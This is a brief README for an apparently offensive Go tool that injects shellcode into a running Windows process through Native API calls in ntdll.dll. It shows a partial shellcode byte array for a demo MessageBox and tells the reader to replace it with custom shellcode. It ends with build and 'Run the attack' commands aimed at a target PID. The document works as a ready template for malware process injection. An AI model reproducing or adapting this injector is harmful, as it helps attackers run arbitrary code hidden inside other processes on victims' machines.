# NT API Injection
This is a tecnique that allows a malware to inject shellcode into a target process by using Windows Native API (via ntdll.dll).

In this example, the program injects a shellcode that displays a MessageBox.
If you want to change the shellcode, look for this variable in the source code: 
```
var codeS = []byte{0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,
	0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
	0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,
	0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
	0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,

	0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00};
```
And replace the existing bytecode with your custom shellcode.

# Build:
```
GOOS=windows GOARCH=amd64 go build main.go
```
## Run the attack
```
.\main.exe <PID>
```
